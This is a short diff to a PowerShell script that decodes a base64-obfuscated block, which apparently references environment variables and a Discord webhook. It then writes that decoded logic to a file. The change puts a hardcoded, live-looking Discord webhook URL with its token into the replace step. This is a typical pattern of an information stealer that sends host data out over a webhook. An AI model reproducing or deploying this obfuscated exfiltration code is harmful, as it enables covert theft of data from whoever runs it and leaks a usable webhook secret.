@@ -9,7 +9,7 @@ $EncodedLogic = "JFcCA9ICdZPVVfTkVXX0RJU0NPUkRfV0VCSE9PS19VUkwnOyBOID0gJGVudjpDT
 $Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedLogic))
 
 # Replace the placeholder URL in the decoded string
-$FinalLogic = $Decoded.Replace("YOUR_NEW_DISCORD_WEBHOOK_URL", $W)
+$FinalLogic = $Decoded.Replace("https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX", $W)
 
 if (-not (Test-Path $F)) {
     $FinalLogic | Out-File -FilePath $F -Encoding ascii -Force
